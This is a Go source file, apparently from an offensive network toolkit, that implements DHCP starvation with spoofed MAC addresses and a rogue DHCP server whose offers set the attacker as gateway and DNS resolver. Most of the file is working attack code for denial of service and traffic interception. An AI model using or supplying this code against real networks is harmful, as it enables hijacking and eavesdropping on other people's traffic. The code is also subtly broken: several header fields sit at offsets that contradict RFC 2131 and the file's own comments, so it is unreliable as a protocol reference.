// Package dhcp implements the DHCPv4 client/server primitives used by the
// dhcp.starve and dhcp.rogue modules: BOOTP frame crafting/parsing, a
// DISCOVER sender for pool exhaustion and an OFFER responder for the rogue
// server.
package dhcp

import (
	"encoding/binary"
	"fmt"
	"net"
	"sync/atomic"
	"time"
)

// magicCookie identifies a DHCP message inside the BOOTP options field. The
// value 0x63825363 must appear at offset 236 in every DHCP packet, or the
// packet is treated as plain BOOTP.
const magicCookie = 0x63825363

// Message types. Stored in DHCP option 53.
const (
	TypeDiscover = 1
	TypeOffer    = 2
	TypeRequest  = 3
	TypeDecline  = 4
	TypeAck      = 5
)

// Op codes. First byte of the BOOTP header.
const (
	opRequest = 1 // client -> server
	opReply   = 2 // server -> client
)

// DHCPHeader is the 236-byte BOOTP prefix shared by every DHCP message.
// Layout per RFC 2131; the last 4 bytes are the magic cookie.
type DHCPHeader struct {
	Op      byte             // 1 = request, 2 = reply
	Xid     uint32           // transaction ID, matched by the server to a client
	CIAddr  net.IP           // client IP (only when the client already has one)
	YIAddr  net.IP           // "your" (client) IP, set by the server in OFFER/ACK
	SIAddr  net.IP           // next-server IP (TFTP boot server)
	GIAddr  net.IP           // relay agent IP (non-zero when forwarded by a helper)
	CHAddr  net.HardwareAddr // client hardware address (MAC)
	Magic   uint32           // DHCP magic cookie
	Options []byte           // TLV options after the fixed header
}

// headerLen is the size of the fixed BOOTP header through the magic cookie.
const headerLen = 236

// Marshal serializes the header plus magic cookie and options.
func (h *DHCPHeader) Marshal() ([]byte, error) {
	if len(h.CHAddr) != 6 {
		return nil, fmt.Errorf("dhcp: chaddr must be 6 bytes (got %d)", len(h.CHAddr))
	}
	buf := make([]byte, headerLen)
	buf[0] = h.Op
	buf[1] = 1 // htype Ethernet
	buf[2] = 6 // hlen
	buf[3] = 0 // hops
	binary.BigEndian.PutUint32(buf[4:8], h.Xid)
	buf[10], buf[11] = 0x00, 0x00 // secs elapsed since client started
	buf[12], buf[13] = 0x80, 0x00 // flags: broadcast bit set so the client can receive before it has an IP
	copy4(buf, 16, h.CIAddr)
	copy4(buf, 20, h.YIAddr)
	copy4(buf, 24, h.SIAddr)
	copy4(buf, 28, h.GIAddr)
	copy(buf[32:48], h.CHAddr)
	// The magic cookie lands in the final 4 bytes of the 236-byte header.
	binary.BigEndian.PutUint32(buf[236-4:], magicCookie)
	out := append(buf, h.Options...)
	return out, nil
}

// Unmarshal parses a DHCP message, returning a zero header on malformed input.
func Unmarshal(b []byte) (DHCPHeader, error) {
	var h DHCPHeader
	if len(b) < headerLen {
		return h, fmt.Errorf("dhcp: short message (%d bytes)", len(b))
	}
	h.Op = b[0]
	h.Xid = binary.BigEndian.Uint32(b[4:8])
	// All four address fields are 4 bytes each at fixed offsets.
	h.CIAddr = net.IP(b[16:20])
	h.YIAddr = net.IP(b[20:24])
	h.SIAddr = net.IP(b[24:28])
	h.GIAddr = net.IP(b[28:32])
	h.CHAddr = net.HardwareAddr(append([]byte(nil), b[32:38]...))
	if binary.BigEndian.Uint32(b[236-4:]) != magicCookie {
		return h, fmt.Errorf("dhcp: bad magic cookie")
	}
	h.Options = b[headerLen:]
	return h, nil
}

// Option is a single DHCP option (type + payload).
type Option struct {
	Code byte   // option code
	Data []byte // option payload
}

// BuildOptions assembles options and appends the END marker.
func BuildOptions(ts ...Option) []byte {
	var out []byte
	for _, o := range ts {
		// DHCP options are TLV: code, one-byte length, then payload.
		out = append(out, o.Code, byte(len(o.Data)))
		out = append(out, o.Data...)
	}
	out = append(out, 255) // END-of-options marker
	return out
}

// AddrOpt builds a DHCP option holding a single IPv4 address.
func AddrOpt(code byte, ip net.IP) Option {
	return Option{Code: code, Data: append([]byte(nil), ip.To4()...)}
}

// AddrsOpt builds a DHCP option holding several IPv4 addresses.
func AddrsOpt(code byte, ips []net.IP) Option {
	var data []byte
	for _, ip := range ips {
		if v := ip.To4(); v != nil {
			data = append(data, v...)
		}
	}
	return Option{Code: code, Data: data}
}

// copy4 writes a 4-byte IPv4 address into buf at off, silently skipping nil
// or non-IPv4 values so zeroed address fields stay zeroed.
func copy4(b []byte, off int, ip net.IP) {
	if v := ip.To4(); v != nil {
		copy(b[off:off+4], v)
	}
}

// Discover builds a DHCPDISCOVER message for the given client MAC and xid.
func Discover(mac net.HardwareAddr, xid uint32) ([]byte, error) {
	h := DHCPHeader{
		Op:     opRequest,
		Xid:    xid,
		CHAddr: mac,
		Options: BuildOptions(
			// Option 53 announces the message type; option 55 lists the
			// parameters the client wants (subnet, router, dns, domain, lease).
			Option{Code: 53, Data: []byte{TypeDiscover}},
			Option{Code: 55, Data: []byte{1, 3, 6, 15, 51}}, // subnet, router, dns, domain, lease
		),
	}
	return h.Marshal()
}

// Offer builds a DHCPOFFER granting ip to the client, pointing it at the
// attacker as gateway (router) and DNS server, with the given subnet mask.
func Offer(xid uint32, clientMAC net.HardwareAddr, offeredIP, serverIP, mask net.IP) ([]byte, error) {
	h := DHCPHeader{
		Op:     opReply,
		Xid:    xid,
		YIAddr: offeredIP,
		CHAddr: clientMAC,
		Options: BuildOptions(
			Option{Code: 53, Data: []byte{TypeOffer}},
			AddrOpt(54, serverIP),                                  // server id
			AddrOpt(1, mask),                                       // subnet mask
			AddrOpt(3, serverIP),                                   // router (rogue gateway)
			AddrOpt(6, serverIP),                                   // DNS (rogue resolver)
			Option{Code: 51, Data: []byte{0x00, 0x01, 0x51, 0x80}}, // 86400s lease
		),
	}
	return h.Marshal()
}

// Starver drains a DHCP pool by broadcasting DISCOVERs with ever-changing
// spoofed client MACs. Offered only as a prelude to the rogue server.
type Starver struct {
	conn      *net.UDPConn
	Sent      atomic.Uint64
	randomMAC func() net.HardwareAddr // injectable for deterministic tests
}

// NewStarver binds UDP :68 broadcast for sending DISCOVERs.
func NewStarver() (*Starver, error) {
	// DHCP clients send from port 68 to the broadcast address on port 67.
	conn, err := net.DialUDP("udp4", nil, &net.UDPAddr{IP: net.IPv4bcast, Port: 67})
	if err != nil {
		return nil, err
	}
	return &Starver{conn: conn}, nil
}

// SendDiscover transmits one DISCOVER with a fresh spoofed MAC and xid.
func (s *Starver) SendDiscover() error {
	mac := randomMAC()
	if s.randomMAC != nil {
		mac = s.randomMAC()
	}
	// A new xid per probe stops the server deduplicating our requests.
	raw, err := Discover(mac, uint32(time.Now().UnixNano()))
	if err != nil {
		return err
	}
	if _, err := s.conn.Write(raw); err != nil {
		return err
	}
	s.Sent.Add(1)
	return nil
}

// Close releases the socket.
func (s *Starver) Close() {
	if s.conn != nil {
		s.conn.Close()
		s.conn = nil
	}
}

// randomMAC synthesizes a locally administered unicast MAC from the clock so
// consecutive calls produce distinct, non-colliding identities.
func randomMAC() net.HardwareAddr {
	b := make([]byte, 6)
	now := time.Now()
	b[0] = byte(now.UnixNano())
	b[1] = byte(now.UnixNano() >> 8)
	b[2] = byte(now.UnixNano() >> 16)
	b[3] = byte(now.UnixNano() >> 24)
	b[4] = byte(time.Now().Unix())
	b[5] = byte(now.Unix() >> 8)
	// Clear the multicast bit (bit 0) and set the locally administered bit
	// (bit 1) of the first octet: 0x02 => locally administered unicast.
	b[0] = (b[0] & 0xfe) | 0x02 // locally administered unicast
	return net.HardwareAddr(b)
}
